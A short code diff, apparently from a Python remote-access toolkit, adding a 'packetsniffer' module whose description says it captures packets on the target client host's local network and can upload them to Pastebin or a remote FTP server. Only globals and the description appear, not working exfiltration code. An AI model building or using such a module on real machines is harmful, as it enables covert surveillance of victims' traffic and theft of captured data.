@@ -21,9 +21,15 @@ sys.modules['util'] = util
 # globals
 packages  = []
 platforms = ['linux2','darwin']
+results   = Queue.Queue()
 log       = StringIO.StringIO()
-util.is_compatible(platforms, __name__)
-util.imports(packages, __builtins__)
+usage  = 'packetsniffer [seconds]'
+desription = """ 
+Capture packets on the target client host machine's local network
+and optionally upload them to Pastebin or to a remote FTP server
+
+"""
+
 
 # main
 def _udp_header(data):
